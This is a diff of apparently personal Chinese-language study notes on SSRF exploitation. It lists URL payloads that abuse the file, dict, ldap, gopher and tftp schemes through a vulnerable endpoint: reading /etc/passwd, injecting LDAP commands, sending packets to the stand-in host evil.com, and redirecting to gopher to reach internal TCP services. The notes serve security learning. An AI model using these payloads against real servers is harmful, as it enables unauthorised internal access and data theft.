@@ -27,24 +27,21 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
 * 第一个请求 通常是HTTP协议
 * 第二个请求 由应用程序本身功能决定 理论上可以有各种protocol/scheme
   * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
+  * SSH `scp://` `sftp://`
   * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
-  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
   * `ldap://` LDAP(Lightweight Directory Access Protocol,轻量级目录访问协议)
     * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
     * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
     * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
   * `gopher://`
-    * `http://example.com/ssrf.php?url=http://evil.com/gopher.php` 重定向到 `gopher://`
+    * 重要作用:几乎可与任意**TCP** service交互
+      * (1)指定`ip` `port` `bytes`
+      * (2)you can exploit a SSRF to communicate with any TCP service.(but you need to know how to talk to the service first.)
+    * 利用过程 `http://example.com/ssrf.php?url=http://evil.com/gopher.php` 重定向到 `gopher://yourlink.tld`. [详细过程](ssrf利用过程---gopher协议结合跳转)
   * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议) works over UDP
-    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
+    * 重要作用:几乎可构造并发送任意的**UDP** packets
+    * 利用过程
 
-
-* Gopher协议 - 重要作用:几乎可与任意TCP service交互
-  * (1)指定监听`ip` `port` `bytes`
-  * (2)you can exploit a SSRF to communicate with any TCP service.(but you need to know how to talk to the service first.)
-
-
-* TFTP协议 - 重要作用:几乎可构造并发送任意的**UDP** packets
 ```
 Request:
 https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET
@@ -218,7 +215,7 @@ SSRF自动化工具 用于发现漏洞、生成payload等
 
 -----
 
-### gopher协议 - 结合跳转利用SSRF过程
+### SSRF利用过程 - gopher协议结合跳转
 
 前提：存在SSRF漏洞的web后端所用的函数支持gopher协议.
 
